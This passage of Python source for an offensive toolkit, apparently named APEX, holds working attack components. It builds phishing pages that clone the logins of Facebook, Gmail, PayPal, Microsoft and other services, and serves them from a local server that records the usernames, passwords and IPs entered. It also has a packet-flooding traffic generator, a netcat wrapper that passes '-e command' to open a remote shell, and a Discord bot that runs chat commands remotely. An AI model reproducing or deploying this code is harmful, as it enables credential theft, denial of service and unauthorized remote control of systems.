                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load phishing templates"""
        return {
            'facebook': self._facebook_template,
            'instagram': self._instagram_template,
            'twitter': self._twitter_template,
            'gmail': self._gmail_template,
            'linkedin': self._linkedin_template,
            'github': self._github_template,
            'microsoft': self._microsoft_template,
            'apple': self._apple_template,
            'amazon': self._amazon_template,
            'paypal': self._paypal_template,
            'custom': self._custom_template
        }
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        template_func = self.templates.get(platform, self._custom_template)
        html = template_func()
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        from http.server import HTTPServer, BaseHTTPRequestHandler
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _facebook_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">facebook</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _instagram_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Instagram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _twitter_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center}
h2{text-align:center}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2>
<form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _gmail_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Gmail</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _linkedin_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">LinkedIn</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _github_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>
body{background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#f0f6fc}
.login-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:32px;width:340px}
.logo{font-size:40px;text-align:center}
h2{text-align:center}
input{width:100%;padding:8px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#f0f6fc}
button{width:100%;padding:10px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer}
.warning{margin-top:16px;padding:10px;background:#1c2333;border:1px solid #30363d;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">GitHub</div><h2>Sign in to GitHub</h2>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _microsoft_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:4px;padding:44px;width:440px}
.logo{color:#ff5722;font-size:28px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Microsoft</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _apple_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:12px;padding:40px;width:420px}
.logo{font-size:36px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px}
button{width:100%;padding:12px;background:#007aff;color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo"> Apple ID</div>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _amazon_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>
body{background:#e3e6e6;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:32px;width:378px}
.logo{color:#f90;font-size:36px;text-align:center}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px}
button{width:100%;padding:10px;background:#f0c14b;color:#111;border:1px solid #a88734;border-radius:4px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fdf5e6;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Amazon</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _paypal_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>
body{background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#003087;font-size:28px;text-align:center}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
button{width:100%;padding:12px;background:#0070ba;color:white;border:none;border-radius:20px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo">PayPal</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _custom_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a1a2e;font-size:28px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:white;border:none;border-radius:8px;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#f8d7da;border-radius:8px;color:#721c24;text-align:center}
</style>
</head>
<body>
<div class="login-box"><div class="logo"><h1>APEX Secure Portal</h1></div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"APEX"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"APEX", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "APEX"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "APEX"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "APEX"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=APEX_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=APEX_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    def __init__(self, command_handler, db: DatabaseManager):
        self.handler = command_handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE:
            return False
        if not self.config.get('token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.PURPLE}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(
                    title="🦅 APEX-BOT Response",
                    description=f"```{output}```",
                    color=0x6A0DAD  # Purple
                )
                embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
